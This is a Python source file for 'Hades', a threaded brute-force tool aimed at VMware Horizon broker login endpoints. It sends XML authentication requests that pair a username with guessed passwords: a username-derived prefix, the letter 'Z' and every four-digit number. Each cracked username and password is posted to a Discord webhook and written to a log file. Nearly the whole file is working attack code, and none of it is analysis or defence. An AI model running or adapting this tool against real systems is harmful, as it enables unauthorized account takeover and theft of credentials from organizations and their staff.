# Hades

from requests import get, post
from threading import Thread
from time import sleep, time
from pystyle import Anime, Colorate, Colors, Center, System, Write
from random import shuffle


System.Title('Hades')
System.Size(140, 40)


class Make:
    def mkdata(usr: str, psd: str):
        return f"""<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>windows-password</name><params><param><name>username</name><values><value>{usr}</value></values></param><param><name>domain</name><values><value>{domain}</value></values></param><param><name>password</name><values><value>{psd}</value></values></param></params></screen></do-submit-authentication></broker>"""

    def mkwordlist(f: int = 0, t: int = 10000):

        w = []
        for i in range(f, t):
            if i == 0:
                i = "0000"
            if len(str(i)) == 1:
                i = f'000{i}'
            elif len(str(i)) == 2:
                i = f'00{i}'
            elif len(str(i)) == 3:
                i = f'0{i}'
            w.append(str(i))

        return w

    def mkproxy(proxy: str):
        return {"http": "http://" + proxy}


def send(data: str):
    r = post(url, data=data, headers={}).text
    return "Unknown user name or bad password." not in r


def crack(number: str):
    global cracked, actual
    if cracked:
        return
    try:
        psd = password + number
        r = send(Make.mkdata(username, psd))
        if cracked:
            return
        print(Colorate.Horizontal(Colors.red_to_purple,
              f"Trying {actual}/{len(wordlist)}  |  '{psd}' for '{username}'  |  {_time(time() - sec)}s"))
        actual += 1
        if r:
            cracked = psd
    except:
        sleep(interval)
        crack(number)


def send_webhook(psd):
    embeds = [
        {
            "title": "Hades",
            "description": "Cracked!",
            "url": "https://github.com/billythegoat356/Hades",
            "color": 0x800000,
            "fields": [
                {
                    "name": "Username:",
                    "value": f"`{username}`",
                    "inline": True
                },
                {
                    "name": "Password:",
                    "value": f"`{psd}`",
                    "inline": True
                },
                {
                    "name": "Time:",
                    "value": f"`{_time(time() - sec)}s`"
                },
                {
                    "name": "Tries:",
                    "value": f"`{actual - 1}`"
                }
            ],
            "footer": {
                "text": "by billythegoat356",
                "icon_url": "https://avatars.githubusercontent.com/u/77754159?v=4"
            },
            "timestamp": "2001-09-10T22:00:00.000Z",
            "image": {
                "url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a"
            },
            "thumbnail": {
                "url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a"
            }
        }
    ]

    data = {"username": "Hades",
            "avatar_url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a",
            "embeds": embeds}

    return post(webhook, json=data)


def _time(t):
    t = str(t)
    t = t.split('.')
    return t[0] + '.' + t[1][0]



hades = r'''
  ::   .:    :::.   :::::::-.  .,::::::   .::::::.
 ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
"$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
 888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
 MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
'''

mode = "[$; [$; [$; Bruteforce ;$] ;$] ;$]"

ascii = r'''
                ::   .:    :::.   :::::::-.  .,::::::   .::::::.
               ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
              ,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
              "$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
               888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
               MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
                          ___
  .::.                   ( ((
 'H .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(D ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_(('''[1:]


def main():  # sourcery no-metrics skip: move-assign
    global username, password, url, domain, interval, cracked, wordlist, actual, webhook, sec, logfile

    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
    print()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
    print('\n'*3)

    url = Write.Input("VMware Url -> ", Colors.red_to_purple, interval=0.0025)
    for suffix in ("http://", "https://"):
        if url.startswith(suffix):
            url = url.replace(suffix, "")
    url = url.split('/')
    url = "http://" + url[0] + "/broker/xml"
    try:
        s = get(url).status_code
        if s == 404:
            Colorate.Error("Error! Url is invalid.")
            return
    except:
        Colorate.Error("Error! Url is invalid.")
        return

    domain = Write.Input("Enter VMware domain -> ", Colors.red_to_purple, interval=0.0025)

    username = Write.Input(
        "Username -> ", Colors.red_to_purple, interval=0.0025)

    if len(username) < 3:
        return main()

    pe = 's' if '.' in username else 't'

    password = username[:3] + 'Z' if pe == 's' else username + 'Z'


    interval = Write.Input("Interval between every try (press 'enter' for '0.25') -> ",
                        Colors.red_to_purple, interval=0.0025)

    if interval == '':
        interval = '0.25'

    try:
        interval = float(interval)
    except ValueError:
        Colorate.Error("Error! Interval has to be an integer/float.")
        return


    print()

    wordlist = Make.mkwordlist()

    webhook = Write.Input("Enter your Discord webhook for logs (press 'enter' to pass) -> ", Colors.red_to_purple, interval=0.0025)

    logfile = Write.Input("Stock the logs in a file [y/n] -> ", Colors.red_to_purple, interval=0.0025)
    logfile = logfile == "y"

    print()

    shuf = Write.Input("Shuffle the wordlist [y/n] -> ", Colors.red_to_purple, interval=0.0025)
    
    if shuf == 'y':
        shuffle(wordlist)

    cracked = False

    print("\n\n")

    Write.Input("Ready to attack! Press 'enter' to start...", Colors.blue_to_purple, interval=0.0025)

    System.Clear()

    Write.Print("Starting attack...", Colors.blue_to_purple, interval=0.0025)

    sec = time()

    print('\n\n')

    ths = []

    actual = 1
    
    send_webhook(f"starting attack with '{password + wordlist[0]}'")

    for number in wordlist:
        if cracked:
            break

        while True:
            if cracked:
                break
            try:
                th = Thread(target=crack, args=[number])
                ths.append(th)
                th.start()
            except:
                continue
            break

        sleep(interval)


    if not cracked:
        for th in ths:
            th.join()
        System.Clear()
        print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
        print('\n'*3)
        if logfile:
            with open('cracked.txt', 'a', encoding='utf-8') as f:
                f.write("Username: " + username + '\nPassword: ' + "nothing found" + '\n\n')
        send_webhook(f"nothing found for '{password + wordlist[0]}'")
        Write.Input("Nothing found. Press 'enter' to return to the main menu.",
                    Colors.blue_to_purple, interval=0.0025)

    else:
        System.Clear()
        print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
        print('\n'*3)
        if logfile:
            with open('cracked.txt', 'a', encoding='utf-8') as f:
                f.write("Username: " + username + '\nPassword: ' + cracked + '\n\n')
        send_webhook(cracked)
        Write.Input(f"Cracked: '{cracked}' for '{username}' in {_time(time() - sec)} seconds and {actual - 1} tries! Press 'enter' to return to the main menu.",
                    Colors.blue_to_purple, interval=0.0025)


if __name__ == '__main__':
    Anime.Fade(Center.Center(ascii), Colors.red_to_purple,
               Colorate.Vertical, time=True, enter=True)

    while True:
        try:
            main()
        except Exception as e:
            Colorate.Error(str(e))
